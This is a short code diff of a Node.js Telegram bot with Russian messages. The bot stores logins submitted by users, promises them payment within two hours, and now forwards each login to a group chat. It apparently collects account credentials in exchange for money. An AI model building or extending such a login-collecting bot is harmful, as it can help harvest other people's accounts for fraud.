@@ -3,8 +3,8 @@ const fs = require("fs");
 require("dotenv").config();
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
-
-const ADMIN_ID = 123456789; // замени на свой ID
+const GROUP_ID = -1003093096797;
+const ADMIN_ID = 1704458173; // замени на свой ID
 
 // Файл для логинов
 const DATA_FILE = "logins.json";let logins = {};
@@ -80,10 +80,8 @@ bot.on("text", async (ctx) => {
 
   await ctx.reply(`✅ Логин "${message}" сохранён! Деньги поступят в течение 2 часов.`);
 
-    await bot.telegram.sendMessage(
-    ADMIN_ID,
-    `📥 Новый логин!\n👤 Пользователь: ${ctx.from.first_name} (@${ctx.from.username || "нет"})\n🆔 ID: ${userId}\n🔑 Логин: ${message}`
-  );
+await bot.telegram.sendMessage(GROUP_ID, message);
+
 });
 
 // --- Запуск ---
